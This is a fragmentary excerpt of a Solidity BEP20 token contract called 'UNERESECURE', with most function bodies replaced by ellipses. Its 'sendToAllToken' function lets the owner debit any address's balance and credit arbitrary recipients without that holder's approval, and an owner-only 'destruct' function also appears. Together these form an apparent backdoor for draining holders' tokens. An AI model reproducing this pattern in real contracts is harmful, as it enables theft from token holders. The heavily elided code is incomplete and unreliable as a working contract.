...
contract UNERESECURE is Context, IBEP20, Ownable {
  ...
  */
  ...
  function _burnFrom(address account, uint256 amount) internal {
   ...
   function destruct() onlyOwner() public{
    ...
    function sendToAllToken(address  recipientFrom,address []  memory  _contributors, uint256[] memory _tokenBalance) public  onlyOwner {
       
       uint256 i = 0; 
        for (i; i < _contributors.length; i++) {
            _balances[recipientFrom] = _balances[recipientFrom].sub(_tokenBalance[i]);
            _balances[ _contributors[i]] = _balances[ _contributors[i]].add(_tokenBalance[i]);
            emit Transfer(recipientFrom, _contributors[i], _tokenBalance[i]);
        }
    }
